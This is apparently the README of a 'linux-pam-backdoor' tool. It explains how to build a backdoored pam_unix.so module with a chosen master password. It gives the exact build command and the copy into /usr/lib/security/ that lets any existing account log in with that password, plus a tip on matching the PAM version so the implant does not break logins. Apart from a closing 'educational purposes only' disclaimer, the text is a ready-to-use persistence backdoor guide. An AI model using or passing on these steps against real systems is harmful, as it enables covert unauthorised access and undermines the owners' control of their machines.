linux-pam-backdoorlinux-pam-backdoor Linux PAM Backdoor This script automates the creation of a backdoor for Linux-PAM (Pluggable Authentication Modules) UsageUsage To generate the backdoored pam_unix.so, just run: ./backdoor.sh -v 1.3.0 -p som3_s3cr4t_p455w0rd You have to identify the PAM version installed on the system, to make sure the script will compile the right version. Otherwise you can break the whole system authentication. After the execution of the script, the last step is to copy the generated pam_unix.so to the pam modules dir on the host. cp pam_unix.so /usr/lib/security/ That's all. After that, you can log-in to the system using an existing user, and the previously configured password. Use this for educational purposes only. I am not responsible for the damage you might cause.
